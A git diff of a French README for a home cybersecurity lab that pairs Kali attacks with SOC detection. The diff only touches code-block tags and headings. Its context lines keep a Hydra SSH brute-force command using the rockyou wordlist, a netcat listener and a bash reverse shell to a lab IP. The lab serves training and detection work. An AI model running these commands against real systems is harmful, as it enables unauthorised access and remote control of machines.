@@ -47,7 +47,7 @@ Ce projet démontre des compétences **réelles, pratiques et opérationnelles**
 
 #### Commande Hydra :
 
-```
+```bash
 hydra -l dexter -P /usr/share/wordlists/rockyou.txt -t 1 -W 3 ssh://192.168.100.11
 ```
 
@@ -75,13 +75,13 @@ hydra -l dexter -P /usr/share/wordlists/rockyou.txt -t 1 -W 3 ssh://192.168.100.
 
 #### Sur Kali :
 
-```
+```bash
 nc -lvnp 4444
 ```
 
 #### Sur Debian compromis :
 
-```
+```bash
 bash -i >& /dev/tcp/192.168.100.12/4444 0>&1
 ```
 
@@ -103,7 +103,7 @@ bash -i >& /dev/tcp/192.168.100.12/4444 0>&1
 
 **Exemple :**
 
-```
+```text
 /etc/resolv.conf — modified — Rule 550 — Level 7
 ```
 
@@ -124,7 +124,7 @@ Analyse complète de l’exposition du système + recommandations de durcissemen
 
 ---
 
-##  5. Résultats & Analyse SOC
+## 5. Résultats & Analyse SOC
 
 Ce lab permet :
 
@@ -157,7 +157,7 @@ Ce projet démontre une capacité à travailler comme :
 
 ---
 
-## 🚀 7. Améliorations futures
+## 7. Améliorations futures
 
 - Intégration Zabbix  
 - Ajout d’un honeypot  
